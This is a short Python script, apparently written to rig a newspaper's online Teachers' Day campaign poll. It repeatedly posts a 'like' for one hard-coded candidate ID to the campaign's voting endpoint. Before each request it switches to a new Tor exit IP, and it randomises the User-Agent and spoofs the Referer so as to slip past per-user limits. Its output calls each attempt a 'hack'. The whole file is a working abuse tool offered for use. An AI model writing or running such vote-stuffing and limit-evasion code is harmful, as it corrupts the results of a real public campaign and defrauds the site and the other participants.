#!/usr/bin/env python

import requests
from fake_useragent import UserAgent
import time

from stem import Signal
from stem.control import Controller

def newHeader():
    ua = UserAgent()
    header={
        'Referer': 'http://campaign.thedailystar.net/teachersday',
        'User-Agent': ua.random
    }
    return header

################### CONFIG ######################
# heroes
reza = 306
biplob = 450

url = 'http://campaign.thedailystar.net/teachersday/setlike'
data={
    'id': reza
}
headers = newHeader()
################### CONFIG ######################

# def newSession():     # keeps session
#     session = requests.session()
#     session.proxies = {'http':  'socks5://127.0.0.1:9050',
#                        'https': 'socks5://127.0.0.1:9050'}
#     return session

proxy = {'http':  'socks5://127.0.0.1:9050',
         'https': 'socks5://127.0.0.1:9050'}

def newConn(): # tor connection
    with Controller.from_port(port = 9051) as controller: # edit /etc/torrc -> uncomment ControlPort 9051
        controller.authenticate(password="password")
        controller.signal(Signal.NEWNYM)
    time.sleep(2)


for i in range(100):
    print '[*] Changing IP...'
    newConn()
    
    print '[*] Sending request...'
    response = requests.post(url, data=data, headers=headers, proxies=proxy)
    
    if response.text == '-1':
        print '[-] Hack failed:', response.text
        headers = newHeader()
    else:
        print '[+] Hack successful:', response.text

    time.sleep(6)

